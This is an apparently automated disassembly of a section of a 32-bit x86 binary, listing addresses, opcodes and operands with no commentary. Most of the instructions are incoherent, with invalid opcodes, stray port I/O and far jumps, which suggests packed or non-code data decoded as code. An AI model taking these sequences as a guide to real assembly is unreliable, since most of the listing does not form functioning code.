  40f173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f174:	cmp    DWORD PTR ds:0xc300ff23,ecx
  40f17a:	inc    edi
  40f17b:	pop    edx
  40f17c:	mov    dl,0xcb
  40f17e:	mov    esi,0x6e52f811
  40f183:	push   cs
  40f184:	or     bl,0xf1
  40f187:	ret    0x2a7b
  40f18a:	push   esp
  40f18b:	sbb    BYTE PTR ds:0xa4b3,ch
  40f190:	jbe    0x40f1bf
  40f192:	das    
  40f193:	and    edi,DWORD PTR [ebx-0x51713678]
  40f199:	(bad)  
  40f19a:	mov    esp,0xdd4aee5d
  40f19f:	adc    cl,bh
  40f1a1:	in     al,dx
  40f1a2:	ret    
  40f1a3:	mov    ah,0x3b
  40f1a5:	mov    al,0x97
  40f1a7:	or     bh,BYTE PTR [esi]
  40f1a9:	mov    ebx,0x15d86d4c
  40f1ae:	sahf   
  40f1af:	gs sti 
  40f1b1:	clc    
  40f1b2:	loope  0x40f13f
  40f1b4:	mov    eax,DWORD PTR [eax+0xa0bfab1]
  40f1ba:	nop
  40f1bb:	dec    ebx
  40f1bc:	sbb    dl,BYTE PTR [ebp-0x30]
  40f1bf:	(bad)  [eax+0x7dc85d95]
  40f1c5:	sbb    cl,ch
  40f1c7:	or     BYTE PTR [edi-0x7c],dl
  40f1ca:	or     ah,0xe8
  40f1cd:	data16 aad 0xa4
  40f1d0:	shl    esi,cl
  40f1d2:	(bad)  
  40f1d3:	loopne 0x40f160
  40f1d5:	add    cl,ch
  40f1d7:	xor    BYTE PTR [eax-0x4f],ah
  40f1da:	push   0xd17a9b71
  40f1df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1e0:	aad    0xe2
  40f1e2:	je     0x40f234
  40f1e4:	lds    edx,FWORD PTR [edi]
  40f1e6:	pop    edi
  40f1e7:	arpl   dx,ax
  40f1e9:	cdq    
  40f1ea:	mov    dh,0x33
  40f1ec:	aaa    
  40f1ed:	inc    esp
  40f1ee:	outs   dx,BYTE PTR ds:[esi]
  40f1ef:	fbstp  TBYTE PTR [eax-0x10bd7e96]
  40f1f5:	and    BYTE PTR [edi-0x5529c1fe],ch
  40f1fb:	loope  0x40f222
  40f1fd:	pop    ecx
  40f1fe:	cld    
  40f1ff:	or     BYTE PTR [ecx-0x1753e65c],bh
  40f205:	out    0x9,eax
  40f207:	call   0x2a80:0x9f83f5fa
  40f20e:	(bad)
  40f211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f212:	cli    
  40f213:	adc    DWORD PTR [edi],edx
  40f215:	test   BYTE PTR [esi+0x1c],dh
  40f218:	xchg   ebp,eax
  40f219:	pop    ss
  40f21a:	add    DWORD PTR [edi],ebp
  40f21c:	scas   al,BYTE PTR es:[edi]
  40f21d:	sub    esi,DWORD PTR [ebx+0x31]
  40f220:	adc    bl,BYTE PTR [eax-0x29f1a741]
  40f226:	pop    edi
  40f227:	aam    0x45
  40f229:	retf   
  40f22a:	push   0xa2488146
  40f22f:	rol    DWORD PTR [ecx+ebp*2-0x6d799625],0x10
  40f237:	xchg   BYTE PTR [edx+ebp*2],bh
  40f23a:	mov    dh,0xe7
  40f23c:	jge    0x40f22a
  40f23e:	clc    
  40f23f:	inc    esp
  40f240:	push   ebx
  40f241:	jne    0x40f20c
  40f243:	int3   
  40f244:	or     al,0xd
  40f246:	push   eax
  40f247:	xchg   esp,eax
  40f248:	cmp    BYTE PTR ds:[ebx+0x75782014],ah
  40f24f:	jle    0x40f22d
  40f251:	mov    dh,0x74
  40f253:	in     al,0xdb
  40f255:	sub    al,0x59
  40f257:	dec    ecx
  40f258:	ja     0x40f223
  40f25a:	loop   0x40f25b
  40f25c:	jne    0x40f256
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx+0x380c9dd9]
  40f282:	dec    edx
  40f283:	popa   
  40f284:	stos   BYTE PTR es:[edi],al
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f283
  40f28c:	in     eax,0xb6
  40f28e:	std    
  40f28f:	and    edx,DWORD PTR [ebp+0x6e60bbe4]
  40f295:	mov    ecx,0x382dba21
  40f29a:	mov    ?,eax
  40f29c:	jno    0x40f2ba
  40f29e:	add    ebx,DWORD PTR [esp+edx*8+0xa44eafa]
  40f2a5:	push   ds
  40f2a6:	out    0x64,al
  40f2a8:	js     0x40f2b4
  40f2aa:	test   eax,ecx
  40f2ac:	sbb    al,0xd4
  40f2ae:	mov    bl,BYTE PTR [ebp+0x1c]
  40f2b1:	repnz and eax,0x8d9ceb66
  40f2b7:	push   ebx
  40f2b8:	push   ecx
  40f2b9:	sub    BYTE PTR [edi-0x38c51d21],dl
  40f2bf:	jge    0x40f2f1
  40f2c1:	sub    BYTE PTR [ecx+ebp*2],dl
  40f2c4:	mov    dh,0xe
  40f2c6:	hlt    
  40f2c7:	mov    ds:0xf0627d7d,eax
  40f2cc:	cmc    
  40f2cd:	pop    es
  40f2ce:	mov    al,0x43
  40f2d0:	das    
  40f2d1:	(bad)  [edx]
  40f2d3:	sbb    ebp,DWORD PTR [ebx+0x174b75d9]
  40f2d9:	nop
  40f2da:	pop    ss
  40f2db:	jo     0x40f352
  40f2dd:	fstp   DWORD PTR [ecx+0x42]
  40f2e0:	lods   eax,DWORD PTR ds:[esi]
  40f2e1:	jp     0x40f2b3
  40f2e3:	jge    0x40f334
  40f2e5:	mov    eax,ds:0x6933f4d4
  40f2ea:	data16 (bad) 
  40f2ec:	cmp    edx,esp
  40f2ee:	sub    eax,0xa0c35e57
  40f2f3:	ficom  DWORD PTR [edi+0x20]
  40f2f6:	cmp    eax,0x96d32550
  40f2fb:	dec    edx
  40f2fc:	pusha  
  40f2fd:	add    DWORD PTR [esi-0x68],esi
  40f300:	or     DWORD PTR [ebx+0x6c],edi
  40f303:	inc    eax
  40f304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f305:	sbb    BYTE PTR [eax-0x10cda7be],0xf0
  40f30c:	mov    BYTE PTR [ebp-0x74e7491],bh
  40f312:	scas   al,BYTE PTR es:[edi]
  40f313:	std    
  40f314:	in     eax,dx
  40f315:	(bad)  
  40f316:	mov    ah,0x19
  40f318:	add    dh,bh
  40f31a:	pop    ebp
  40f31b:	add    edx,edx
  40f31d:	mov    ebp,0x14572d29
  40f322:	adc    edi,eax
  40f324:	xchg   esp,eax
  40f325:	ds retf 
  40f327:	retf   
  40f328:	mov    cl,BYTE PTR [edx+0x19]
  40f32b:	dec    edx
  40f32c:	or     al,0xf3
  40f32f:	push   ebp
  40f330:	jmp    0xb85:0x9ae9576e
  40f337:	icebp  
  40f338:	es dec ecx
  40f33a:	call   0xb2fa3463
  40f33f:	pop    esp
  40f340:	dec    esp
  40f341:	xor    eax,0x5f3d721c
  40f346:	xchg   DWORD PTR [eax+eax*8],edx
  40f349:	push   ebp
  40f34a:	test   eax,0xf2352615
  40f34f:	ja     0x40f36e
  40f351:	fwait
  40f352:	push   es
  40f353:	push   edx
  40f354:	push   ebx
  40f355:	dec    edi
  40f356:	mov    ah,0xfc
  40f358:	pop    ebp
  40f359:	jo     0x40f2db
  40f35b:	jns    0x40f39e
  40f35d:	sub    edi,DWORD PTR [edx+edx*4+0x6954e1ef]
  40f364:	addr16 xchg ecx,eax
  40f366:	mov    ds:0x9d5a2408,al
  40f36b:	add    al,0xb6
  40f36d:	loop   0x40f39f
  40f36f:	sub    BYTE PTR [esi+0x688db284],ch
  40f375:	or     al,BYTE PTR [eax+eax*8+0x31]
  40f379:	push   edi
  40f37a:	imul   DWORD PTR [edx+edx*1+0x71b13cc4]
  40f381:	or     al,0x2c
  40f383:	add    DWORD PTR [edi+0x40a72494],0xbcad4fe
  40f38d:	rcr    DWORD PTR [esi],0x29
  40f390:	mov    BYTE PTR [edx-0x22],bh
  40f393:	dec    esi
  40f394:	fs pop edi
  40f396:	rcl    ebx,1
  40f398:	stos   DWORD PTR es:[edi],eax
  40f399:	in     eax,dx
  40f39a:	dec    edx
  40f39b:	sub    al,0xc4
  40f39d:	mov    dh,0x57
  40f39f:	sahf   
  40f3a0:	fbstp  TBYTE PTR [eax]
  40f3a2:	stos   DWORD PTR es:[edi],eax
  40f3a3:	loopne 0x40f3ff
  40f3a5:	fadd   QWORD PTR [edi]
  40f3a7:	sub    ecx,DWORD PTR [esi-0x2e]
  40f3aa:	imul   edx,DWORD PTR es:[esi-0x53faa9a5],0xffffff90
  40f3b2:	mov    edi,0x6cd4abc5
  40f3b7:	ror    DWORD PTR [edx+0x7a],cl
  40f3ba:	aam    0x66
  40f3bc:	or     BYTE PTR [esi+0x2f46a36],dh
  40f3c2:	xchg   esi,eax
  40f3c3:	sbb    DWORD PTR [eax-0x65fc46a3],esp
  40f3c9:	cmp    al,dl
  40f3cb:	(bad)  
  40f3cc:	mov    al,0x12
  40f3ce:	adc    al,0x47
  40f3d0:	aas    
  40f3d1:	mov    WORD PTR [ebp-0x5c578a18],cs
  40f3d7:	and    al,0xab
  40f3d9:	xchg   BYTE PTR [edx+0x4f],al
  40f3dc:	cmp    eax,DWORD PTR [edx+0x6e]
  40f3df:	or     BYTE PTR ds:0x4affa571,0x14
  40f3e6:	xchg   ecx,eax
  40f3e7:	add    al,BYTE PTR [ecx+eiz*4-0x49]
  40f3eb:	loopne 0x40f371
  40f3ed:	mov    dl,0x48
  40f3ef:	mov    cl,dh
  40f3f1:	mov    edi,0x36a9f7e9
  40f3f6:	and    DWORD PTR [eax+0x79fc4ff1],0xdee1b5b5
  40f400:	pusha  
  40f401:	mov    ds:0x5ad7c2cd,eax
  40f406:	stc    
  40f407:	or     eax,0x37152b6e
  40f40c:	sbb    ebp,DWORD PTR [esi]
  40f40e:	aad    0x18
  40f410:	and    DWORD PTR cs:[ecx+0x3e110878],edi
  40f417:	fistp  WORD PTR [ecx-0x9]
  40f41a:	push   es
  40f41b:	mov    ch,0x4a
  40f41d:	lock inc edi
  40f41f:	mov    al,0x33
  40f421:	jmp    0x6b08c615
  40f426:	pop    edx
  40f427:	adc    dl,BYTE PTR [edx-0x69]
  40f42a:	pop    ecx
  40f42b:	pop    ebp
  40f42c:	jb     0x40f3f4
  40f42e:	inc    eax
  40f42f:	mov    bh,0xc1
  40f431:	fwait
  40f432:	fwait
  40f433:	add    ebp,esi
  40f435:	enter  0x157d,0xbf
  40f439:	sub    WORD PTR [eax],ax
  40f43c:	jl     0x40f44e
  40f43e:	jae    0x40f3cb
  40f440:	(bad)
  40f443:	jae    0x40f492
  40f445:	lods   eax,DWORD PTR ds:[esi]
  40f446:	lahf   
  40f447:	adc    BYTE PTR cs:[esi+0xe],al
  40f44b:	rcr    DWORD PTR [ebx-0x44],cl
  40f44e:	pop    esi
  40f44f:	mov    DWORD PTR [edi+0x32308a8e],edi
  40f455:	xor    eax,0x8d981d43
  40f45a:	hlt    
  40f45b:	adc    al,0xec
  40f45d:	ds xchg ebp,eax
  40f45f:	inc    ecx
  40f460:	mov    dl,0x24
  40f462:	jno    0x40f4ad
  40f464:	jo     0x40f43c
  40f466:	es xchg edx,eax
  40f468:	xor    al,0x26
  40f46a:	and    al,0x7b
  40f46c:	(bad)  
  40f46d:	not    BYTE PTR [ecx-0x5832a116]
  40f473:	xor    al,0x20
  40f475:	cmc    
  40f476:	in     al,dx
  40f477:	add    BYTE PTR [esi],ch
  40f479:	sub    DWORD PTR [edi+0x17c3becb],edi
  40f47f:	mov    dh,BYTE PTR [esi]
  40f481:	aas    
  40f482:	in     al,dx
  40f483:	dec    esi
  40f484:	ss inc esi
  40f486:	mov    ebx,0xb8eebde1
  40f48b:	lock sbb eax,0xa019945
  40f491:	and    al,0x49
  40f493:	dec    ebp
  40f494:	sub    eax,0x41788bf1
  40f499:	xchg   ebp,eax
  40f49a:	inc    ecx
  40f49b:	push   cs
  40f49c:	call   0x63827c91
  40f4a1:	xchg   DWORD PTR [ebx+ebp*2+0x1d823432],ebx
  40f4a8:	and    eax,0x28b53f88
  40f4ad:	clc    
  40f4ae:	mov    ch,al
  40f4b0:	xchg   ebx,eax
  40f4b1:	mov    ecx,0xf09e2957
  40f4b6:	push   edi
  40f4b7:	stos   BYTE PTR es:[edi],al
  40f4b8:	inc    ebx
  40f4b9:	cli    
  40f4ba:	inc    edx
  40f4bb:	adc    ah,BYTE PTR [eax+0x7f]
  40f4be:	jg     0x40f481
  40f4c0:	inc    ebx
  40f4c1:	adc    al,0xe0
  40f4c3:	adc    BYTE PTR [esi-0xa],bl
  40f4c6:	retf   
  40f4c7:	push   edi
  40f4c8:	jbe    0x40f520
  40f4ca:	test   edx,ebx
  40f4cc:	fsubrp st(5),st
  40f4ce:	inc    esp
  40f4cf:	and    BYTE PTR [ecx+0x4ea38c1b],ah
  40f4d5:	dec    al
  40f4d7:	loop   0x40f4bc
  40f4d9:	push   0xfda63622
  40f4de:	into   
  40f4df:	aam    0x1c
  40f4e1:	fld    st(4)
  40f4e3:	xor    eax,0xc48aa68a
  40f4e8:	bound  esi,QWORD PTR [esi+ebx*1-0x55]
  40f4ec:	aas    
  40f4ed:	sbb    al,0x10
  40f4ef:	ds sbb ah,0xdc
  40f4f3:	leave  
  40f4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4f5:	in     al,0x71
  40f4f7:	sub    DWORD PTR [ecx+0x71],esi
  40f4fa:	mov    ah,0x66
  40f4fc:	mov    cl,0xde
  40f4fe:	in     al,dx
  40f4ff:	imul   edi,DWORD PTR [ebx],0x45
  40f502:	rcl    DWORD PTR [ecx],cl
  40f504:	ja     0x40f4de
  40f506:	addr16 pop ebx
  40f508:	aaa    
  40f509:	xchg   esp,eax
  40f50a:	mov    dl,0x84
  40f50c:	mov    bh,0xb8
  40f50e:	push   edx
  40f50f:	xchg   ecx,eax
  40f510:	stos   DWORD PTR es:[edi],eax
  40f511:	mov    al,0x47
  40f513:	lods   al,BYTE PTR ds:[esi]
  40f514:	cmp    eax,0xb31c1638
  40f519:	aad    0xd2
  40f51b:	mov    al,BYTE PTR ds:0xedc24f35
  40f521:	jecxz  0x40f50a
  40f523:	fisttp DWORD PTR ds:0xecad2de
  40f529:	push   es
  40f52a:	pop    ebx
  40f52b:	(bad)  
  40f52c:	fisttp QWORD PTR [ecx]
  40f52e:	push   DWORD PTR [esi+0x35]
  40f531:	retf   
  40f532:	or     ebp,DWORD PTR [eax-0x7ed4f29c]
  40f538:	jno    0x40f5a7
  40f53a:	sbb    BYTE PTR [edx+0x6c9bfeda],0xf4
  40f541:	pop    eax
  40f542:	xor    ebx,DWORD PTR [ebx]
  40f544:	pop    ecx
  40f545:	shr    DWORD PTR [ebp-0x59],cl
  40f548:	sub    esp,DWORD PTR [ecx+0x47]
  40f54b:	inc    eax
  40f54c:	mov    bl,0x9b
  40f54e:	test   ebp,edx
  40f550:	mov    gs,WORD PTR [eax+0x6823866b]
  40f556:	gs lahf 
  40f558:	test   dl,dh
  40f55a:	data16 fwait
  40f55c:	cmp    ebx,0x8407ce30
  40f562:	stos   DWORD PTR es:[edi],eax
  40f563:	inc    edx
  40f564:	jl     0x40f541
  40f566:	adc    ch,ah
  40f568:	dec    ebx
  40f569:	sbb    eax,0x90fd94bf
  40f56e:	cmp    BYTE PTR [ebp-0x7c],ah
  40f571:	jne    0x40f4f4
  40f573:	daa    
  40f574:	sub    ebp,DWORD PTR [edi]
  40f576:	stos   BYTE PTR es:[edi],al
  40f577:	inc    ebp
  40f578:	push   edi
  40f579:	sub    eax,0x120263ea
  40f57e:	outs   dx,DWORD PTR ds:[esi]
  40f57f:	jae    0x40f528
  40f581:	loope  0x40f560
  40f583:	loope  0x40f5fc
  40f585:	ins    DWORD PTR es:[edi],dx
  40f586:	and    al,0x54
  40f588:	inc    ebp
  40f589:	shl    BYTE PTR [edx],cl
  40f58b:	jmp    0x40f57a
  40f58d:	int3   
  40f58e:	push   ebp
  40f58f:	out    dx,al
  40f590:	outs   dx,BYTE PTR ds:[esi]
  40f591:	jbe    0x40f56f
  40f593:	jecxz  0x40f5b1
  40f595:	dec    ecx
  40f596:	mov    cl,0x5a
  40f598:	push   ebp
  40f599:	nop
  40f59a:	dec    eax
  40f59b:	add    BYTE PTR [ecx-0x75],ch
  40f59e:	test   BYTE PTR [esi+ecx*4],dl
  40f5a1:	out    dx,al
  40f5a2:	mov    DWORD PTR [esi],eax
  40f5a4:	xchg   edi,eax
  40f5a5:	mov    eax,ds:0x81a60d67
  40f5aa:	inc    eax
  40f5ab:	or     ebp,DWORD PTR [ecx+0x895385f]
  40f5b1:	call   0xf1ce:0x91049e85
  40f5b8:	push   ds
  40f5b9:	adc    dl,BYTE PTR [esi+0x6d]
  40f5bc:	or     esp,DWORD PTR [ebp+0x26]
  40f5bf:	rol    DWORD PTR [esi+0x74fc4cd7],cl
  40f5c5:	and    eax,0x28db6afc
  40f5ca:	push   eax
  40f5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5cc:	inc    ebx
  40f5cd:	adc    eax,0x598be340
  40f5d2:	dec    ebp
  40f5d3:	ja     0x40f5e6
  40f5d5:	add    dh,bh
  40f5d7:	add    ecx,ecx
  40f5d9:	in     al,0xe1
  40f5db:	xchg   esp,eax
  40f5dc:	push   eax
  40f5dd:	(bad)  
  40f5de:	in     eax,0x81
  40f5e0:	push   0xffffffdf
  40f5e2:	cmp    eax,0xb26af603
  40f5e7:	inc    edi
  40f5e8:	je     0x40f5fa
  40f5ea:	and    edx,DWORD PTR [ebp+0x59face13]
  40f5f0:	fs or  eax,0xf58e016d
  40f5f6:	pop    edx
  40f5f7:	jbe    0x40f61a
  40f5f9:	cmp    ecx,DWORD PTR [eax+0x9]
  40f5fc:	(bad)  
  40f5fd:	lea    ecx,[edx]
  40f5ff:	mov    ebp,0xe3ff0910
  40f604:	in     eax,0x81
  40f606:	pop    esp
  40f607:	mov    esp,0x21a247db
  40f60c:	(bad)  [ecx]
  40f60e:	in     eax,dx
  40f60f:	push   es
  40f610:	pop    eax
  40f611:	sub    dh,BYTE PTR [edi+0x38]
  40f614:	xchg   DWORD PTR [ebx-0x60f9f733],ecx
  40f61a:	cmp    DWORD PTR [ebx],ecx
  40f61c:	jns    0x40f5fe
  40f61e:	fsubr  DWORD PTR [ecx]
  40f620:	scas   al,BYTE PTR es:[edi]
  40f621:	xor    eax,0x9f9e73d1
  40f626:	jbe    0x40f64a
  40f628:	pop    ds
  40f629:	adc    al,BYTE PTR [eax-0x50]
  40f62c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f62d:	jmp    0xe065d40
  40f632:	pop    ds
  40f633:	push   cs
  40f634:	pop    esi
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x43366f,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x43365f,0x433623
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0x46b548f9
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0x767c7c7e
  40f67b:	sahf   
  40f67c:	aam    0xf4
  40f67e:	fnstcw WORD PTR [ebx*1+0x4e76b3e5]
  40f685:	dec    eax
  40f686:	aam    0xfa
  40f688:	retf   0xdbec
  40f68b:	(bad)  
  40f68c:	iret   
  40f68d:	lahf   
  40f68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f68f:	ja     0x40f6cc
  40f691:	inc    ebp
  40f692:	rol    ebx,0x85
  40f695:	push   0x45
  40f697:	loop   0x40f642
  40f699:	add    esp,DWORD PTR [edi]
  40f69b:	mov    WORD PTR [edx+0x40b7a06f],fs
  40f6a1:	retf   
  40f6a2:	adc    DWORD PTR [esi+0x6398b916],edi
  40f6a8:	daa    
  40f6a9:	inc    ebx
  40f6aa:	outs   dx,BYTE PTR ds:[esi]
  40f6ab:	push   es
  40f6ac:	add    DWORD PTR [eax+0x67],0xffffffcb
  40f6b0:	popa   
  40f6b1:	in     eax,0x1c
  40f6b3:	or     al,0xc
  40f6b5:	sbb    al,0x31
  40f6b7:	in     eax,0xc3
  40f6b9:	inc    edx
  40f6ba:	lea    ecx,[edx]
  40f6bc:	out    0xc4,eax
  40f6be:	inc    edx
  40f6bf:	repnz pop es
  40f6c1:	or     eax,DWORD PTR [esi]
  40f6c3:	sbb    eax,DWORD PTR [ebx-0x5a97ddf2]
  40f6c9:	add    eax,0x52b990a5
  40f6ce:	add    bl,BYTE PTR [esi-0x5a97d917]
  40f6d4:	je     0x40f66c
  40f6d6:	sbb    bh,BYTE PTR es:[ecx*2-0xb2ea0]
  40f6de:	dec    edi
  40f6df:	sti    
  40f6e0:	inc    ebx
  40f6e1:	sbb    al,BYTE PTR [esi]
  40f6e3:	fist   WORD PTR [edi+0x721e8a53]
  40f6e9:	jns    0x40f68a
  40f6eb:	sub    BYTE PTR [ebp+0x3fec34b3],dl
  40f6f1:	shr    DWORD PTR [eax-0x3a],1
  40f6f4:	adc    al,0x95
  40f6f6:	or     eax,0x339dbeb5
  40f6fb:	mov    esi,?
  40f6fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6fe:	ja     0x40f728
  40f700:	clc    
  40f701:	sahf   
  40f702:	xchg   ebx,eax
  40f703:	mov    ds:0xcaee64bf,al
  40f708:	test   DWORD PTR [eax+0x36],edi
  40f70b:	test   al,0x50
  40f70d:	mov    edx,0xa53f4153
  40f712:	mov    bh,0x25
  40f714:	adc    eax,0x3d065810
  40f719:	push   ds
  40f71a:	and    ebp,DWORD PTR [ecx+0x14c51c34]
  40f720:	dec    esi
  40f721:	ins    DWORD PTR es:[edi],dx
  40f722:	sub    eax,0xef8180a6
  40f727:	lea    eax,[edx+0x52f1a46]
  40f72d:	ss inc esi
  40f72f:	dec    ebp
  40f730:	(bad)  
  40f731:	test   DWORD PTR [ebp+eiz*2-0x793e0c7d],0xd7af2276
  40f73c:	mov    eax,ds:0x3f3717ac
  40f741:	call   0x50907bae
  40f746:	cmp    BYTE PTR [ebp-0x1d1833ac],ch
  40f74c:	pop    ss
  40f74d:	jecxz  0x40f76f
  40f74f:	xor    eax,0x4c17516a
  40f754:	js     0x40f7bf
  40f756:	aam    0x37
  40f758:	shr    BYTE PTR [ebp+esi*2+0x72390e11],0xc9
  40f760:	loopne 0x40f7ca
  40f762:	aas    
  40f763:	push   ds
  40f764:	push   esi
  40f765:	dec    esi
  40f766:	or     eax,0x7dd3c96
  40f76b:	je     0x40f7eb
  40f76d:	jae    0x40f76b
  40f76f:	add    dl,0x48
  40f772:	dec    edi
  40f773:	push   cs
  40f774:	hlt    
  40f775:	push   cs
  40f776:	test   eax,0x3f86725
  40f77b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f77c:	ja     0x40f72c
  40f77e:	xor    DWORD PTR [edx+ebp*1+0x6],esi
  40f782:	cmp    esi,esp
  40f784:	(bad)  
  40f785:	lock sub BYTE PTR [edx+edx*2+0x271d72a2],ch
  40f78d:	xor    al,0x47
  40f78f:	ins    DWORD PTR es:[edi],dx
  40f790:	outs   dx,DWORD PTR ds:[esi]
  40f791:	push   es
  40f792:	xor    ecx,edx
  40f794:	jge    0x40f79d
  40f796:	iret   
  40f797:	daa    
  40f798:	dec    esp
  40f799:	pusha  
  40f79a:	jmp    0x74cc24e7
  40f79f:	ins    DWORD PTR es:[edi],dx
  40f7a0:	imul   DWORD PTR [eax+edi*8-0x17]
  40f7a4:	lods   eax,DWORD PTR ds:[esi]
  40f7a5:	pop    ds
  40f7a6:	test   eax,0x262528f8
  40f7ab:	and    eax,0xab252d45
  40f7b0:	xor    BYTE PTR [eax-0x6a6eb4aa],bl
  40f7b6:	scas   al,BYTE PTR es:[edi]
  40f7b7:	or     ecx,esi
  40f7b9:	xchg   BYTE PTR [ebx-0x5a],bl
  40f7bc:	sub    al,0x20
  40f7be:	cld    
  40f7bf:	lds    esp,FWORD PTR [ecx+ecx*1+0x47255705]
  40f7c6:	sub    ebx,edi
  40f7c8:	push   0x962844a7
  40f7cd:	pop    ds
  40f7ce:	xor    al,BYTE PTR [ecx-0x1a32942d]
  40f7d4:	adc    DWORD PTR [edi],ebx
  40f7d6:	adc    eax,0xb8876bc2
  40f7db:	add    edx,edi
  40f7dd:	ret    
  40f7de:	stc    
  40f7df:	add    al,0x42
  40f7e1:	push   edi
  40f7e2:	jns    0x40f7c4
  40f7e4:	jge    0x40f808
  40f7e6:	sbb    ebx,DWORD PTR [edi+ebx*2]
  40f7e9:	lock mov esi,0xbe223656
  40f7ef:	pop    ecx
  40f7f0:	xor    DWORD PTR [eax-0x78],esp
  40f7f3:	add    eax,0xee2ca6c0
  40f7f8:	add    al,0x71
  40f7fa:	shl    DWORD PTR [eax+0x79ae2f59],cl
  40f800:	js     0x40f7bb
  40f802:	std    
  40f803:	stc    
  40f804:	sbb    al,0xaa
  40f806:	leave  
  40f807:	shl    DWORD PTR [eax],0x4e
  40f80a:	inc    ebp
  40f80b:	ins    BYTE PTR es:[edi],dx
  40f80c:	xchg   ebx,eax
  40f80d:	lahf   
  40f80e:	adc    ah,dh
  40f810:	retf   
  40f811:	pop    ds
  40f812:	int3   
  40f813:	outs   dx,DWORD PTR ds:[esi]
  40f814:	in     eax,0x6f
  40f816:	retf   0x90e0
  40f819:	cmp    edi,DWORD PTR [edx-0x2f4d9fda]
  40f81f:	daa    
  40f820:	jb     0x40f813
  40f822:	xor    BYTE PTR [edi],cl
  40f824:	(bad)  
  40f825:	jl     0x40f829
  40f827:	and    ebx,ebx
  40f829:	ds mov cl,0x52
  40f82c:	mov    esi,0x8ab20cdf
  40f831:	das    
  40f832:	push   cs
  40f833:	mov    ebp,0xadf4e46d
  40f838:	mov    edx,0xffe428e4
  40f83d:	enter  0x3d1f,0xcc
  40f841:	adc    ecx,DWORD PTR [eax-0x709ebea]
  40f847:	cli    
  40f848:	in     eax,dx
  40f849:	adc    BYTE PTR [ebx],al
  40f84b:	(bad)  
  40f84c:	(bad)  
  40f84d:	xor    BYTE PTR [edx-0x28],bl
  40f850:	cld    
  40f851:	xchg   esi,eax
  40f852:	adc    bl,BYTE PTR [ebx+0x539be8e7]
  40f858:	daa    
  40f859:	pop    es
  40f85a:	lock inc ebx
  40f85c:	or     bh,BYTE PTR ds:[edi+0x4d9ce917]
  40f863:	xlat   BYTE PTR cs:[ebx]
  40f865:	loopne 0x40f896
  40f867:	fist   DWORD PTR [edx]
  40f869:	nop
  40f86a:	sbb    eax,0x5ef0e1ec
  40f86f:	dec    edx
  40f870:	aas    
  40f871:	cmp    BYTE PTR ds:0x7fa9ca1d,0xd7
  40f878:	xor    eax,0x80a81f22
  40f87d:	hlt    
  40f87e:	cmp    ecx,DWORD PTR [eax]
  40f880:	push   edi
  40f881:	in     al,0xd
  40f883:	jae    0x40f89c
  40f885:	xor    BYTE PTR [edx-0x4a9f6a9e],cl
  40f88b:	(bad)  
  40f88c:	mov    bh,0xf9
  40f88e:	push   esp
  40f88f:	(bad)  
  40f890:	lahf   
  40f891:	push   edx
  40f892:	scas   eax,DWORD PTR es:[edi]
  40f893:	push   0xc
  40f895:	sbb    DWORD PTR [eax],0x3a48a053
  40f89b:	sbb    ebp,DWORD PTR [esi+0x3a54d91f]
  40f8a1:	jnp    0x40f91f
  40f8a3:	or     bh,BYTE PTR [edx-0x3f]
  40f8a6:	fld    DWORD PTR [ebp+0x31]
  40f8a9:	pop    esp
  40f8aa:	sub    BYTE PTR [esi+0x25c81cc8],bl
  40f8b0:	je     0x40f918
  40f8b2:	loop   0x40f84d
  40f8b4:	ins    DWORD PTR es:[edi],dx
  40f8b5:	sub    cl,BYTE PTR [edi]
  40f8b7:	stc    
  40f8b8:	adc    edx,DWORD PTR [edx]
  40f8ba:	cmp    al,0xf7
  40f8bc:	aas    
  40f8bd:	xor    dl,bh
  40f8bf:	mov    dh,0xeb
  40f8c1:	stos   BYTE PTR es:[edi],al
  40f8c2:	add    dh,BYTE PTR [edi+0x3e5c3526]
  40f8c8:	loopne 0x40f8dd
  40f8ca:	cmp    ah,BYTE PTR [ebp-0x7f]
  40f8cd:	cmc    
  40f8ce:	test   eax,0x8f024bc1
  40f8d3:	fidiv  WORD PTR [ebx+0x49]
  40f8d6:	aad    0xf
  40f8d8:	mov    cl,0xe8
  40f8da:	mov    WORD PTR [ecx-0x2e],?
  40f8dd:	pop    ecx
  40f8de:	js     0x40f8c7
  40f8e0:	cdq    
  40f8e1:	jbe    0x40f867
  40f8e3:	push   ss
  40f8e4:	sub    BYTE PTR [eax-0x15],dl
  40f8e7:	mov    ds:0x8574d78c,al
  40f8ec:	js     0x40f941
  40f8ee:	and    eax,0xdc4669d3
  40f8f3:	sub    bl,ch
  40f8f5:	push   ss
